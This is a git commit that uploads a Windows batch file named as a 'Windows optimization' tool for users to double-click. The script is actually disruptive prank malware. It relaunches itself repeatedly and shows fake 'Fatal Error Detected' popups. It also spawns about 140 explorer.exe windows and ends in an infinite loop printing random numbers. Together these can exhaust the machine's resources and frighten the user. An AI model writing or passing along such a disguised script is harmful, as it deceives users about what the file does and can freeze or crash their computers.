05ea8100b911e33aad588789c3f570e0290ef14b
SilverBaller <163322013+SkullDozer-TheNotASnakeDev@users.noreply.github.com>
2024-04-17 16:28:49 +0700

    Add files via upload

---
+++ WindowsOptimization.Just Double Click!.bat
@@ -0,0 +1,162 @@
+
+start %0 %0
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+msg * Fatal Error Detected.
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+color 0a
+:top
+echo %random% %random% %random% %random% %random% %random% %random% %random%
+%random% %random% %random% %random% %random% %random% %random%
+goto top
